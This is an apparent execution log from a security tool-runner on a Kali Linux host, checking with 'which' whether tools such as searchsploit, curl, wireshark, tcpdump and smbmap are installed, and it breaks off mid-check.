2025-10-24 06:15:12,625 - __main__ - INFO - 🆔 PROCESS: PID 3438 started
2025-10-24 06:15:12,625 - __main__ - INFO - 🆔 REGISTERED: Process 3438 - which searchsploit...
2025-10-24 06:15:12,626 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3438
2025-10-24 06:15:12,628 - __main__ - INFO - 📤 STDOUT: /usr/bin/searchsploit
2025-10-24 06:15:12,632 - __main__ - INFO - 🧹 CLEANUP: Process 3438 removed from registry
2025-10-24 06:15:12,632 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,632 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,632 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,632 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,632 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which searchsploit
2025-10-24 06:15:12,632 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,632 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 06:15:12,632 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,632 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,632 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,632 - __main__ - INFO - 💾 Cached result for command: which searchsploit
2025-10-24 06:15:12,632 - __main__ - INFO - 🔍 Cache MISS for command: which api-schema-analyzer
2025-10-24 06:15:12,632 - __main__ - INFO - 🚀 EXECUTING: which api-schema-analyzer
2025-10-24 06:15:12,632 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,632 - __main__ - INFO - 🆔 PROCESS: PID 3443 started
2025-10-24 06:15:12,632 - __main__ - INFO - 🆔 REGISTERED: Process 3443 - which api-schema-analyzer...
2025-10-24 06:15:12,633 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3443
2025-10-24 06:15:12,637 - __main__ - INFO - 🧹 CLEANUP: Process 3443 removed from registry
2025-10-24 06:15:12,637 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:12,637 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,637 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,637 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,637 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which api-schema-analyzer
2025-10-24 06:15:12,637 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,637 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,637 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,637 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,637 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,638 - __main__ - INFO - 🔍 Cache MISS for command: which postman
2025-10-24 06:15:12,638 - __main__ - INFO - 🚀 EXECUTING: which postman
2025-10-24 06:15:12,638 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,638 - __main__ - INFO - 🆔 PROCESS: PID 3448 started
2025-10-24 06:15:12,638 - __main__ - INFO - 🆔 REGISTERED: Process 3448 - which postman...
2025-10-24 06:15:12,639 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3448
2025-10-24 06:15:12,643 - __main__ - INFO - 🧹 CLEANUP: Process 3448 removed from registry
2025-10-24 06:15:12,643 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:12,643 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,643 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,643 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,643 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which postman
2025-10-24 06:15:12,643 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,643 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,643 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,643 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,643 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,643 - __main__ - INFO - 🔍 Cache MISS for command: which insomnia
2025-10-24 06:15:12,643 - __main__ - INFO - 🚀 EXECUTING: which insomnia
2025-10-24 06:15:12,643 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,643 - __main__ - INFO - 🆔 PROCESS: PID 3453 started
2025-10-24 06:15:12,643 - __main__ - INFO - 🆔 REGISTERED: Process 3453 - which insomnia...
2025-10-24 06:15:12,644 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3453
2025-10-24 06:15:12,651 - __main__ - INFO - 🧹 CLEANUP: Process 3453 removed from registry
2025-10-24 06:15:12,651 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:12,651 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,651 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,651 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,651 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which insomnia
2025-10-24 06:15:12,651 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,651 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,651 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,651 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,651 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,651 - __main__ - INFO - 🔍 Cache MISS for command: which curl
2025-10-24 06:15:12,651 - __main__ - INFO - 🚀 EXECUTING: which curl
2025-10-24 06:15:12,651 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,652 - __main__ - INFO - 🆔 PROCESS: PID 3458 started
2025-10-24 06:15:12,652 - __main__ - INFO - 🆔 REGISTERED: Process 3458 - which curl...
2025-10-24 06:15:12,653 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3458
2025-10-24 06:15:12,655 - __main__ - INFO - 📤 STDOUT: /usr/bin/curl
2025-10-24 06:15:12,657 - __main__ - INFO - 🧹 CLEANUP: Process 3458 removed from registry
2025-10-24 06:15:12,657 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,657 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,657 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,657 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,657 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which curl
2025-10-24 06:15:12,657 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,657 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 14 bytes
2025-10-24 06:15:12,657 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,657 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,657 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,657 - __main__ - INFO - 💾 Cached result for command: which curl
2025-10-24 06:15:12,657 - __main__ - INFO - 🔍 Cache MISS for command: which httpie
2025-10-24 06:15:12,657 - __main__ - INFO - 🚀 EXECUTING: which httpie
2025-10-24 06:15:12,657 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,658 - __main__ - INFO - 🆔 PROCESS: PID 3463 started
2025-10-24 06:15:12,658 - __main__ - INFO - 🆔 REGISTERED: Process 3463 - which httpie...
2025-10-24 06:15:12,658 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3463
2025-10-24 06:15:12,660 - __main__ - INFO - 📤 STDOUT: /usr/bin/httpie
2025-10-24 06:15:12,663 - __main__ - INFO - 🧹 CLEANUP: Process 3463 removed from registry
2025-10-24 06:15:12,663 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,663 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,663 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,663 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,663 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which httpie
2025-10-24 06:15:12,663 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,663 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 06:15:12,663 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,663 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,663 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,663 - __main__ - INFO - 💾 Cached result for command: which httpie
2025-10-24 06:15:12,663 - __main__ - INFO - 🔍 Cache MISS for command: which anew
2025-10-24 06:15:12,663 - __main__ - INFO - 🚀 EXECUTING: which anew
2025-10-24 06:15:12,663 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,663 - __main__ - INFO - 🆔 PROCESS: PID 3468 started
2025-10-24 06:15:12,663 - __main__ - INFO - 🆔 REGISTERED: Process 3468 - which anew...
2025-10-24 06:15:12,664 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3468
2025-10-24 06:15:12,666 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/anew
2025-10-24 06:15:12,669 - __main__ - INFO - 🧹 CLEANUP: Process 3468 removed from registry
2025-10-24 06:15:12,669 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,669 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,669 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,669 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,669 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which anew
2025-10-24 06:15:12,669 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,669 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 06:15:12,670 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,670 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,670 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,670 - __main__ - INFO - 💾 Cached result for command: which anew
2025-10-24 06:15:12,670 - __main__ - INFO - 🔍 Cache MISS for command: which qsreplace
2025-10-24 06:15:12,670 - __main__ - INFO - 🚀 EXECUTING: which qsreplace
2025-10-24 06:15:12,670 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,670 - __main__ - INFO - 🆔 PROCESS: PID 3473 started
2025-10-24 06:15:12,670 - __main__ - INFO - 🆔 REGISTERED: Process 3473 - which qsreplace...
2025-10-24 06:15:12,671 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3473
2025-10-24 06:15:12,672 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/qsreplace
2025-10-24 06:15:12,677 - __main__ - INFO - 🧹 CLEANUP: Process 3473 removed from registry
2025-10-24 06:15:12,677 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,677 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,677 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,677 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,677 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which qsreplace
2025-10-24 06:15:12,677 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,677 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 25 bytes
2025-10-24 06:15:12,677 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,677 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,677 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,677 - __main__ - INFO - 💾 Cached result for command: which qsreplace
2025-10-24 06:15:12,677 - __main__ - INFO - 🔍 Cache MISS for command: which uro
2025-10-24 06:15:12,677 - __main__ - INFO - 🚀 EXECUTING: which uro
2025-10-24 06:15:12,677 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,678 - __main__ - INFO - 🆔 PROCESS: PID 3478 started
2025-10-24 06:15:12,678 - __main__ - INFO - 🆔 REGISTERED: Process 3478 - which uro...
2025-10-24 06:15:12,678 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3478
2025-10-24 06:15:12,683 - __main__ - INFO - 📤 STDOUT: /home/kali/.local/bin/uro
2025-10-24 06:15:12,689 - __main__ - INFO - 🧹 CLEANUP: Process 3478 removed from registry
2025-10-24 06:15:12,689 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,690 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,690 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,690 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,690 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which uro
2025-10-24 06:15:12,690 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,690 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 26 bytes
2025-10-24 06:15:12,690 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,690 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,690 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,690 - __main__ - INFO - 💾 Cached result for command: which uro
2025-10-24 06:15:12,690 - __main__ - INFO - 🔍 Cache MISS for command: which kismet
2025-10-24 06:15:12,690 - __main__ - INFO - 🚀 EXECUTING: which kismet
2025-10-24 06:15:12,690 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,690 - __main__ - INFO - 🆔 PROCESS: PID 3483 started
2025-10-24 06:15:12,690 - __main__ - INFO - 🆔 REGISTERED: Process 3483 - which kismet...
2025-10-24 06:15:12,691 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3483
2025-10-24 06:15:12,693 - __main__ - INFO - 📤 STDOUT: /usr/bin/kismet
2025-10-24 06:15:12,695 - __main__ - INFO - 🧹 CLEANUP: Process 3483 removed from registry
2025-10-24 06:15:12,695 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,695 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,695 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,695 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,695 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which kismet
2025-10-24 06:15:12,695 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,696 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 06:15:12,696 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,696 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,696 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,696 - __main__ - INFO - 💾 Cached result for command: which kismet
2025-10-24 06:15:12,696 - __main__ - INFO - 🔍 Cache MISS for command: which wireshark
2025-10-24 06:15:12,696 - __main__ - INFO - 🚀 EXECUTING: which wireshark
2025-10-24 06:15:12,696 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,696 - __main__ - INFO - 🆔 PROCESS: PID 3488 started
2025-10-24 06:15:12,696 - __main__ - INFO - 🆔 REGISTERED: Process 3488 - which wireshark...
2025-10-24 06:15:12,697 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3488
2025-10-24 06:15:12,699 - __main__ - INFO - 📤 STDOUT: /usr/bin/wireshark
2025-10-24 06:15:12,701 - __main__ - INFO - 🧹 CLEANUP: Process 3488 removed from registry
2025-10-24 06:15:12,701 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,701 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,701 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,701 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,701 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which wireshark
2025-10-24 06:15:12,701 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,701 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 06:15:12,701 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,701 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,701 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,701 - __main__ - INFO - 💾 Cached result for command: which wireshark
2025-10-24 06:15:12,701 - __main__ - INFO - 🔍 Cache MISS for command: which tshark
2025-10-24 06:15:12,702 - __main__ - INFO - 🚀 EXECUTING: which tshark
2025-10-24 06:15:12,702 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,703 - __main__ - INFO - 🆔 PROCESS: PID 3493 started
2025-10-24 06:15:12,703 - __main__ - INFO - 🆔 REGISTERED: Process 3493 - which tshark...
2025-10-24 06:15:12,704 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3493
2025-10-24 06:15:12,704 - __main__ - INFO - 📤 STDOUT: /usr/bin/tshark
2025-10-24 06:15:12,706 - __main__ - INFO - 🧹 CLEANUP: Process 3493 removed from registry
2025-10-24 06:15:12,706 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,706 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,706 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,706 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,706 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which tshark
2025-10-24 06:15:12,706 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,706 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 06:15:12,706 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,706 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,706 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,706 - __main__ - INFO - 💾 Cached result for command: which tshark
2025-10-24 06:15:12,706 - __main__ - INFO - 🔍 Cache MISS for command: which tcpdump
2025-10-24 06:15:12,706 - __main__ - INFO - 🚀 EXECUTING: which tcpdump
2025-10-24 06:15:12,706 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,706 - __main__ - INFO - 🆔 PROCESS: PID 3498 started
2025-10-24 06:15:12,706 - __main__ - INFO - 🆔 REGISTERED: Process 3498 - which tcpdump...
2025-10-24 06:15:12,707 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3498
2025-10-24 06:15:12,709 - __main__ - INFO - 📤 STDOUT: /usr/bin/tcpdump
2025-10-24 06:15:12,711 - __main__ - INFO - 🧹 CLEANUP: Process 3498 removed from registry
2025-10-24 06:15:12,711 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,711 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,711 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,711 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,711 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which tcpdump
2025-10-24 06:15:12,711 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,711 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,711 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,711 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,711 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,711 - __main__ - INFO - 💾 Cached result for command: which tcpdump
2025-10-24 06:15:12,711 - __main__ - INFO - 🔍 Cache MISS for command: which smbmap
2025-10-24 06:15:12,711 - __main__ - INFO - 🚀 EXECUTING: which smbmap
2025-10-24 06:15:12,711 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,712 - __main__ - INFO - 🆔 PROCESS: PID 3503 started
2025-10-24 06:15:12,712 - __main__ - INFO - 🆔 REGISTERED: Process 3503 - which smbmap...
2025-10-24 06:15:12,713 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3503
2025-10-24 06:15:12,714 - __main__ - INFO - 📤 STDOUT: /usr/bin/smbmap
2025-10-24 06:15:12,717 - __main__ - INFO - 🧹 CLEANUP: Process 3503 removed from registry
2025-10-24 06:15:12,717 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,717 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,717 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,717 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,717 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which smbmap
2025-10-24 06:15:12,717 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,717 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 06:15:12,717 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,717 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,717 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,717 - __main__ - INFO - 💾 Cached result for command: which smbmap
2025-10-24 06:15:12,717 - __main__ - INFO - 🔍 Cache MISS for command: which sleuthkit
2025-10-24 06:15:12,717 - __main__ - INFO - 🚀 EXECUTING: which sleuthkit
2025-10-24 06:15:12,717 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,718 - __main__ - INFO - 🆔 PROCESS: PID 3508 started
